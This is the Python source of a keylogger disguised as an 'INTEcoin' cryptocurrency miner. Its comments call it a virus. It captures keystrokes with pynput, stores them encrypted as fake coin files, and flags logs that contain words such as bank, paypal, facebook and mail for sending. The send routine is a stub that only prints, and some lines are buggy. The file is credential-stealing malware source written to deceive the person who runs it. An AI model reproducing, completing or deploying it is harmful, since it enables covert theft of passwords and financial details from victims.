import os.path
import time
import random

from cryptography.fernet import Fernet
from os import path
from pynput.keyboard import Key, Listener

keys = []
count = 0
count2 = 0
MAX_COUNT = 20  # every how many letters to save
BUFFER_SIZE = 2  # every how many saves to send.
FILE_PATH = "INTEcoin.dat"  # change data to logs at the end


class Encryption():
    encryptKey = "bfSmGi_FREbBA4tiQhD23rxeArgAysjxpdCg2mMEjmk="  # generated via: Fernet.generate_key()

    @staticmethod
    def encrypt(text):
        """
        This function encrypts data and returns the encryption.
        :param text: the data to be encrypted.
        :return: the encrypted text
        """
        return Fernet(Encryption.encryptKey).encrypt(text.encode())

    @staticmethod
    def decrypt(text):
        """
        This function decript data and returns it as plain text.
        :param text: the text to decrypt
        :return: plain text decryption.
        """
        return Fernet(Encryption.encryptKey).decrypt(text).decode()

    @staticmethod
    def bytes_from_file(filename, chunksize=8192):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(chunksize)
                if chunk:
                    for b in chunk:
                        yield chr(b)
                else:
                    break


def press(key):
    """
    fucntion that comes from the listener of key pressed, logs the key presses and calls another function to log
    them into a file.
    :param key: the key pressed given from pynput module.
    """
    global keys, count, count2
    keys.append(key)  # append every pressed key.
    count += 1  # keep track of how many keys.
    if count == MAX_COUNT:
        writer(keys)
        count = 0
        keys = []
        count2 += 1
    if count2 >= BUFFER_SIZE:
        count2 = 0
        results()


def release(key):
    """
    A function to act as an exit from the program, technically speaking it's here for now but as a virus we are not
    interested on the user disabling it.
    :param key: key pressed on the keyboard
    :return: if it were to return false it would be to stop the listener.
    """
    if key == "Key.escape":
        return False


def writer(log):
    """
    Saves the log in a txt file
    :param log: an array of pressed keys.
    :return:
    """
    mode = "wb"
    if path.exists(FILE_PATH):
        mode = "ab"
    with open(FILE_PATH, mode) as file:
        toWrite = ""
        for i, key in enumerate(log):
            if i > 0:
                if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                    continue
                if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
                    continue  # don't save multiple enters or spaces.
            key = parse(str(key))  # it's better if it's a string from now on.
            toWrite += key
        file.write(Encryption.encrypt(toWrite))
        file.write(b"@")  # putting a separator for the encryption diod see Fernet using this as the cypher text.
        file.close()


def parse(key):
    """
    takes a string of a key pressed and makes it human readable.
    :param key: a string to parse into readable format.
    :return: the key as readable as possible.
    """
    if key == "'":  # handling the ' sign.
        return key
    key = key.replace("'", "")  # delete ' ' from output
    if key == "Key.enter" or key == "Key.space":
        return "\n"
    if Key in key:
        return key + " " # if it has a "Key" parameter before add a space so it's more readable
    return key


def results():
    """
    steal logic function.
    :return:
    """
    importantWords = ["bank", "hmo", "facebook", "mail", "paypal"]
    toSend = False
    message = ""
    accumulatedLog = []
    for byt in Encryption.bytes_from_file(FILE_PATH):
        if byt == "@":
            accumulatedLog.append(message)
            message = ""
            continue
        message += byt

    message = ""  # reusing the same name.
    print(str(random.randint(1,1000)))
    filename= "INTEcoin" + str(random.randint(1,10000)) + ".dat" #save encrypted data as "coins"

    with open(filename, "wb") as file:
        for mess in accumulatedLog:
            message += Encryption.decrypt(mess.encode()) #decrypt the data
            file.write(mess.encode()) #write the data on a random file for the "miner"
    for word in importantWords: #checking if any sensitive data was inputted.
        if word in message:
            toSend = True
    print(message)
    if toSend:
        send(accumulatedLog, "email")  # send encrypted data.
    # delete file to not send the same data again.
    os.remove(FILE_PATH)


def send(data, email):
    print(data)


with Listener(on_press=press, on_release=release) as listener:
    listener.join()


def miner():
    print("welcome to INTEminer for INTEcoin!")
    print("Mining")
    INTEcoin=0
    while True:
        randomNumber=random.randint(1, 100)
        time.sleep(randomNumber/20) #sleep for a random short time
        print(".", end="")
        if random.randint(1, 10) == 5:
            INTEcoin += randomNumber
            print("Mined a INTEcoin! You currently have {} coins!".format(INTEcoin))


miner()
